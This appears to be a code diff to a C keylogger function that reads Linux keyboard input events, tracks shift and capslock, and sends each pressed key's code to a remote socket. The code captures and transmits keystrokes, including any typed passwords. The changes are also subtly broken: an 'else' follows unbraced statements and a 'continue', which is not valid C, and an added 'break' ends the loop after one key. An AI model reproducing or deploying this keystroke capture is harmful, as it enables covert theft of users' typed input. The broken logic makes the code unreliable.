@@ -151,30 +151,32 @@ void print(int fd, int socket_fd) {
 
         // track with bool values capslock and shift
         // value: 1 == key press, 0 == key release, 2 == key repeat
+        if (ie.type != EV_KEY)
+            continue;
         if (ie.code == KEY_CAPSLOCK && ie.value == 1) {
-            if (capslock)
-                capslock = false;
-            else if (!capslock)
-                capslock = true;
+            capslock = !capslock;
+            continue;
         }
 
         if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT) {
-            if (ie.value == 1 || ie.value == 2)
+            if (ie.value == 1)
                 shift_down = true;
+                continue;
             else if (ie.value == 0)
                 shift_down = false;
+                continue;
         }
 
-        if (ie.type != EV_KEY)
-            continue;
         if (ie.value != 1)
             continue;
 
         if (ie.code >= 2 && ie.code <= 10) {
             len = snprintf(buffer, sizeof(buffer), "%d", ie.code -1);
             n = send(socket_fd, buffer, len, 0);
+            break;
         } else if (ie.code == 11) {
             n = send(socket_fd, "0", 1, 0);
+            break;
         } else {
 
             switch (ie.code) {
@@ -213,7 +215,9 @@ void print(int fd, int socket_fd) {
                             break;
                         }
                     }
-                    if (!good) {
+                    if (!good && (ie.code != KEY_LEFTSHIFT) && (ie.code != KEY_RIGHTSHIFT)
+                        && (ie.code != KEY_CAPSLOCK)) {
+
                         len = snprintf(buffer, sizeof(buffer), "code:%d", ie.code);
                         n = send(socket_fd, buffer, len, 0);
                         break;
